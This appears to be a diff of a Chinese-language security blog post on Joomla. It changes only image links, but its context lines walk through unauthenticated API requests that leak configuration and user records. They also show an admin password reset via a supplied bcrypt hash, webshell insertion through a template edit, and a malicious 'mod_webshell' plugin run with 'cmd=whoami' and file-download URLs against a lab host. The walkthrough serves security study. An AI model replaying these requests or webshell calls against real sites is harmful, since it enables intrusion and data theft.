@@ -15,7 +15,7 @@ ___发表于_
 
 收录于合集
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234617.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234617.png)
 
 **前言**
 
@@ -37,7 +37,7 @@ http://joomla.net:8011/api/index.php/v1/config/application?public=true
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234619.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234619.png)
 
 登录mysql写入webshell，有条件限制
 
@@ -70,7 +70,7 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     api/index.php/v1/users?public=true
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234620.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234621.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234620.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234621.png)
 
 可读取用户信息，使用社工方式暴力破解登录后台，利用进行RCE
 
@@ -96,11 +96,11 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     123456123456::$2y$10$GauLOsp1NBJLO0FGjlqhxOu8LZe9wconNuPwqgjX/pGxAqn7dL5ba
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234622.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234622.png)
 
 修改admin的密码为该密码
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234623.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234623.png)
 
 可登录后台
 
@@ -108,7 +108,7 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
 
  **后台RCE的两种方式**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234624.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234624.png)
 
   * 
 
@@ -116,15 +116,15 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
      Toggle Menu->System->Templates->Site Templates->cassiopeia
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234625.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234625.png)
 
 修改模板文件,添加恶意代码实现命令执行，获取webshell
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234626.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234626.png)
 
 测试webshell
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234627.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234627.png)
 
   * 导入恶意插件
 
@@ -144,7 +144,7 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     Toggle Menu->System-> Extensions
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234628.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234628.png)
 
 下载地址
 
@@ -156,7 +156,7 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
 
 上传下载的恶意插件  
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234629.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234629.png)
 
 上传成功后查看插件管理
 
@@ -166,7 +166,7 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     http://joomla.net:8011/administrator/index.php?option=com_installer&view=manage
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234631.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234631.png)
 
   
 
@@ -176,13 +176,13 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=exec&cmd=whoami
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234632.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234632.png)
 
 成功执行命令
 
 当前目录下创建一个1.txt,，文件内容如下
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234633.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234633.png)
 
   * 
 
@@ -190,11 +190,11 @@ Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshel
     
     http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=download&path=./1.txt
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234634.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234634.png)
 
 文件内容为
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234635.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234635.png)
 
   
 
@@ -210,9 +210,9 @@ https://vulncheck.com/blog/joomla-for-rce
 
 [![]()](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497860&idx=1&sn=4c71ce1396dba6f0880e45d74732c6e2&chksm=eaa970a4dddef9b2eedb3686dcb1b07e25c1bb3904bc6e5f9f349883ff4148013e9c37a0797c&scene=21#wechat_redirect)
 
-[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234636.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497953&idx=1&sn=0c825a2c7832e8b760ad45a77a1b8359&chksm=eaa970c1dddef9d745224f7fdcf496465ef248e460d520d335fa8b1e8f65899aba6efdc16b86&scene=21#wechat_redirect)
+[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234636.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497953&idx=1&sn=0c825a2c7832e8b760ad45a77a1b8359&chksm=eaa970c1dddef9d745224f7fdcf496465ef248e460d520d335fa8b1e8f65899aba6efdc16b86&scene=21#wechat_redirect)
 
-[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234638.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497941&idx=1&sn=5a222c66d2a456b1c08a5bcbd6700535&chksm=eaa970f5dddef9e3f3d943bb064113b43a3665f76f36b7d26e021eb58ddd8ecad94c80c18ec5&scene=21#wechat_redirect)
+[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622234638.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497941&idx=1&sn=5a222c66d2a456b1c08a5bcbd6700535&chksm=eaa970f5dddef9e3f3d943bb064113b43a3665f76f36b7d26e021eb58ddd8ecad94c80c18ec5&scene=21#wechat_redirect)
 
   
 
